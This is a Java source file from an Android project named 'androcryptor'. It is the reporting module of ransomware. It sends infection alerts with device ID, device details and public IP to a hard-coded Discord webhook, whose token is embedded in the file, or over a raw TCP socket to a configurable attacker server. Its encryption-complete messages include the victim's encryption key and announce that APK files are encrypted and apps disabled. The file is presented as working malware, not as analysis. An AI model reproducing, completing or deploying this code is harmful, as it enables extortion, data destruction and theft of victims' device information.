package com.example.androcryptor;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.io.PrintWriter; // Added for TCP communication
import java.net.HttpURLConnection;
import java.net.InetSocketAddress; // Added for socket timeout
import java.net.Socket;     // Added for TCP communication
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * Utility class for sending Discord webhook notifications or to a custom server
 */
public class WebhookUtils {

    private static final String TAG = "WebhookUtils";
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1419412291622801508/U_HVSclwE0MkBG8bLdsLhWygd07LECmgqZHSGwO-jX150A1wUuvf0WDU_ac7YnOa7y9A";

    // Configuration for sending to a custom server IP and Port
    // Set TARGET_SERVER_PORT to 0 to use WEBHOOK_URL.
    // Set TARGET_SERVER_PORT to a non-zero value to send to TARGET_SERVER_IP:TARGET_SERVER_PORT.
    public static String TARGET_SERVER_IP = "127.0.0.1"; // Placeholder: Change to your server's IP
    public static int TARGET_SERVER_PORT = 0;                // Default: 0 (uses webhook), set to e.g., 12345 for custom server

    /**
     * Send a notification when a device is infected
     */
    public static void sendInfectionNotification(final String deviceId, final String deviceInfo) {
        // Create a background thread to fetch public IP and send the webhook
        new Thread(() -> {
            try {
                // Prepare the basic content
                StringBuilder content = new StringBuilder();
                content.append("🔴 **NEW INFECTION** 🔴\\n");
                content.append("Device ID: `").append(deviceId).append("`\\n");
                content.append(deviceInfo);

                // Try to get public IP address
                try {
                    String publicIp = DeviceUtils.getPublicIpAddress();
                    if (publicIp != null && !publicIp.equals("Unknown")) {
                        // Replace the "Fetching..." placeholder with the actual IP
                        String updatedContent = content.toString().replace("- Public IP: Fetching...", "- Public IP: " + publicIp);
                        sendWebhookMessage(updatedContent);
                        return;
                    }
                } catch (Exception e) {
                    Log.e("WebhookUtils", "Error getting public IP", e);
                }

                // If public IP fetch failed, send the original content
                sendWebhookMessage(content.toString());
            } catch (Exception e) {
                Log.e("WebhookUtils", "Error in infection notification thread", e);
            }
        }).start();
    }

    /**
     * Send a notification when encryption is complete
     */
    public static void sendEncryptionCompleteNotification(final String deviceId, final int filesEncrypted) {
        // Only send if files were actually encrypted
        if (filesEncrypted <= 0) {
            Log.d("WebhookUtils", "No files were encrypted, skipping notification");
            return;
        }

        // Create a background thread to fetch public IP and send the webhook
        new Thread(() -> {
            try {
                // Prepare the basic content
                StringBuilder content = new StringBuilder();
                content.append("✅ **ENCRYPTION COMPLETE** ✅\\n");
                content.append("Device ID: `").append(deviceId).append("`\\n");
                content.append("Files Encrypted: ").append(filesEncrypted).append("\\n");

                // Get failed files count from EncryptionService if available
                try {
                    int failedCount = EncryptionService.getFailedFilesCount();
                    if (failedCount > 0) {
                        content.append("⚠️ Files Failed: ").append(failedCount).append("\\n");
                    }
                } catch (Exception ignored) {}

                // Add APK encryption status
                content.append("🔥 **APK FILES ENCRYPTED** 🔥\\n");
                content.append("⚠️ **DEVICE APPS DISABLED** ⚠️\\n");
                
                // Add encryption key (only if not using server mode)
                if (TARGET_SERVER_PORT == 0) {
                    try {
                        byte[] key = EncryptionService.getEncryptionKey();
                        if (key != null) {
                            StringBuilder keyHex = new StringBuilder();
                            for (byte b : key) {
                                keyHex.append(String.format("%02X", b));
                            }
                            content.append("\\n**Encryption Key:** `").append(keyHex.toString()).append("`");
                        }
                    } catch (Exception e) {
                        Log.e("WebhookUtils", "Error getting encryption key", e);
                    }
                }

                // Try to get public IP address
                try {
                    String publicIp = DeviceUtils.getPublicIpAddress();
                    if (publicIp != null && !publicIp.equals("Unknown")) {
                        content.append("\\n**Public IP:** ").append(publicIp);
                    }
                } catch (Exception e) {
                    Log.e("WebhookUtils", "Error getting public IP", e);
                }

                // Send the webhook or to custom server
                sendWebhookMessage(content.toString());
            } catch (Exception e) {
                Log.e("WebhookUtils", "Error in encryption complete notification thread", e);
            }
        }).start();
    }

    /**
     * Send a notification when encryption fails
     */
    public static void sendEncryptionFailedNotification(Context context, final String deviceId, final String errorMessage) {
        // Create a background thread to fetch public IP and send the webhook
        new Thread(() -> {
            try {
                // Prepare the basic content
                StringBuilder content = new StringBuilder();
                content.append("❌ **ENCRYPTION FAILED** ❌\\n");
                content.append("Device ID: `").append(deviceId).append("`\\n");

                // Add error details
                content.append("Error: ").append(errorMessage != null ? errorMessage : "Unknown error").append("\\n");

                // Try to get device info
                try {
                    String deviceInfo = DeviceUtils.getDeviceInfo(context);
                    if (deviceInfo != null && !deviceInfo.isEmpty()) {
                        content.append(deviceInfo);
                    }
                } catch (Exception e) {
                    Log.e("WebhookUtils", "Error getting device info", e);
                }

                // Try to get public IP address
                try {
                    String publicIp = DeviceUtils.getPublicIpAddress();
                    if (publicIp != null && !publicIp.equals("Unknown")) {
                        content.append("\\n**Public IP:** ").append(publicIp);
                    }
                } catch (Exception e) {
                    Log.e("WebhookUtils", "Error getting public IP", e);
                }

                // Send the webhook or to custom server
                sendWebhookMessage(content.toString());
            } catch (Exception e) {
                Log.e("WebhookUtils", "Error in encryption failed notification thread", e);
            }
        }).start();
    }

    /**
     * Send a message either to the Discord webhook or a custom IP/Port.
     * If TARGET_SERVER_PORT is 0, sends to WEBHOOK_URL.
     * Otherwise, sends to TARGET_SERVER_IP:TARGET_SERVER_PORT.
     */
    private static void sendWebhookMessage(String content) {
        new AsyncTask<String, Void, Boolean>() {
            @Override
            protected Boolean doInBackground(String... params) {
                String messageContent = params[0];
                int connectTimeoutMs = 15000; // 15 seconds
                int readTimeoutMs = 15000;    // 15 seconds

                if (TARGET_SERVER_PORT == 0) {
                    // Send to Discord Webhook
                    for (int attempt = 1; attempt <= 3; attempt++) {
                        try {
                            JSONObject json = new JSONObject();
                            json.put("content", messageContent);
                            byte[] postData = json.toString().getBytes(StandardCharsets.UTF_8);

                            URL url = new URL(WEBHOOK_URL);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("POST");
                            conn.setRequestProperty("Content-Type", "application/json");
                            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                            conn.setConnectTimeout(connectTimeoutMs);
                            conn.setReadTimeout(readTimeoutMs);
                            conn.setDoOutput(true);

                            try (OutputStream os = conn.getOutputStream()) {
                                os.write(postData);
                                os.flush();
                            }

                            int responseCode = conn.getResponseCode();
                            Log.d(TAG, "Webhook response code: " + responseCode + " (attempt " + attempt + ")");
                            conn.disconnect();

                            if (responseCode >= 200 && responseCode < 300) {
                                return true; // Success for webhook
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error sending webhook notification (attempt " + attempt + ")", e);
                        }

                        if (attempt < 3) {
                            try {
                                Thread.sleep(1000L * attempt); // Exponential backoff
                            } catch (InterruptedException ie) {
                                Thread.currentThread().interrupt();
                                return false; // Interrupted, stop trying
                            }
                        }
                    }
                    Log.w(TAG, "All webhook notification attempts failed for: " + messageContent.substring(0, Math.min(messageContent.length(), 100)));
                    return false; // All webhook attempts failed
                } else {
                    // Send to custom Server IP and Port
                    Socket socket = null;
                    try {
                        socket = new Socket();
                        socket.connect(new InetSocketAddress(TARGET_SERVER_IP, TARGET_SERVER_PORT), connectTimeoutMs);
                        socket.setSoTimeout(readTimeoutMs); // Read timeout

                        try (PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
                            out.println(messageContent); // Send the raw content
                            Log.d(TAG, "Successfully sent data to " + TARGET_SERVER_IP + ":" + TARGET_SERVER_PORT);
                            return true; // Success for custom server
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending data to " + TARGET_SERVER_IP + ":" + TARGET_SERVER_PORT, e);
                        return false; // Failed to send to custom server
                    } finally {
                        if (socket != null) {
                            try {
                                socket.close();
                            } catch (Exception e) {
                                Log.e(TAG, "Error closing socket", e);
                            }
                        }
                    }
                }
            }

            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    if (TARGET_SERVER_PORT == 0) {
                        Log.d(TAG, "Webhook notification sent successfully");
                    } else {
                        Log.d(TAG, "Data sent successfully to custom server: " + TARGET_SERVER_IP + ":" + TARGET_SERVER_PORT);
                    }
                } else {
                    if (TARGET_SERVER_PORT == 0) {
                        Log.w(TAG, "Failed to send webhook notification after multiple attempts");
                    } else {
                        Log.w(TAG, "Failed to send data to custom server " + TARGET_SERVER_IP + ":" + TARGET_SERVER_PORT);
                    }
                }
            }
        }.execute(content);
    }
}
